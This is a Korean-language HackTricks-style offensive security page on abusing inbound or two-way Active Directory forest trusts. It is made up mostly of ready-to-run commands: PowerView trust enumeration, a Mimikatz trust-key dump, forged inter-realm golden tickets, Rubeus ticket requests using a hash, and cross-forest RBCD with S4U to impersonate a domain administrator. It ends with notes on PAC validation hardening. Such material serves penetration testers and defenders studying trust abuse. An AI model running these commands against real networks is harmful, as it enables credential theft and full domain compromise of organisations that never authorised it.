# 외부 포리스트 도메인 - OneWay (Inbound) 또는 양방향

{{#include ../../banners/hacktricks-training.md}}

이 시나리오에서는 외부 도메인이 당신을 신뢰(또는 양쪽이 서로를 신뢰)하고 있어, 해당 도메인에 대해 어떤 형태의 접근을 얻을 수 있습니다.

## 열거

무엇보다 먼저, **trust(신뢰)**를 **열거(enumerate)** 해야 합니다:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*`을(를) 통해 cross-forest abuse paths (RBCD, SIDHistory)가 추가 전제조건 없이 작동할 가능성이 있는지 빠르게 확인할 수 있습니다.

이전 enumeration에서 사용자 **`crossuser`**가 **`External Admins`** 그룹에 속해 있으며, 해당 그룹이 **외부 도메인의 DC** 내부에서 **Admin access** 권한을 가지고 있다는 것을 발견했습니다.

## 초기 접근

만약 다른 도메인에서 사용자에게 어떤 **특별한** 액세스도 **찾지 못했다면**, AD Methodology로 돌아가 **privesc from an unprivileged user**(예: kerberoasting 등)을 시도해 볼 수 있습니다:

다음과 같이 `-Domain` 파라미터를 사용하여 **Powerview functions**로 **다른 도메인**을 **enumerate**할 수 있습니다:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## 사칭

### 로그인

외부 도메인에 접근 권한이 있는 사용자의 자격 증명을 사용해 일반적인 방법으로 로그인하면 다음에 접근할 수 있어야 합니다:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History 악용

또한 [**SID History**](sid-history-injection.md)를 포리스트 트러스트 전반에서 악용할 수 있습니다.

사용자가 **한 포리스트에서 다른 포리스트로** 마이그레이션되고 **SID Filtering이 활성화되어 있지 않다면**, **다른 포리스트의 SID를 추가할 수 있게** 되며, 이 **SID**는 **트러스트를 통해 인증할 때** 사용자의 **토큰**에 **추가됩니다**.

> [!WARNING]
> 참고로, 서명 키는 다음으로 얻을 수 있습니다
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

현재 도메인의 사용자를 **가장하는 TGT**에 대해 **trusted** 키로 **서명할** 수 있습니다.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### 사용자를 완전히 가장하는 방법
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### 신뢰 포리스트에서 컴퓨터 계정을 제어할 때의 Cross-forest RBCD (no SID filtering / selective auth)

만약 외부 프린시펄(FSP)이 신뢰 포리스트에서 컴퓨터 객체를 쓸 수 있는 그룹(예: `Account Operators`, custom provisioning group)에 속하게 되면, 해당 포리스트의 대상 호스트에 **Resource-Based Constrained Delegation**을 구성하여 그곳의 어떤 사용자든 가장할 수 있습니다:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
이 방법은 **SelectiveAuthentication is disabled** 상태이고 **SID filtering**이 제어하는 SID를 제거하지 않을 때만 작동합니다. 이는 SIDHistory 위조를 피하는 빠른 수평 이동 경로이며, 트러스트 검토에서 종종 놓칩니다.

### PAC 검증 강화

PAC 서명 검증 업데이트(**CVE-2024-26248**/**CVE-2024-29056**)는 포리스트 간 티켓에 대한 서명 강제를 추가합니다. **Compatibility mode**에서는 위조된 inter-realm PAC/SIDHistory/S4U 경로가 패치되지 않은 DCs에서 여전히 동작할 수 있습니다. **Enforcement mode**에서는 서명되지 않았거나 변조된 PAC 데이터가 포리스트 트러스트를 넘나들 경우 거부되며, 대상 포리스트 트러스트 키를 보유한 경우에만 허용됩니다. 레지스트리 오버라이드(`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`)는 해당 설정이 사용 가능한 동안 이를 약화시킬 수 있습니다.



## References

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
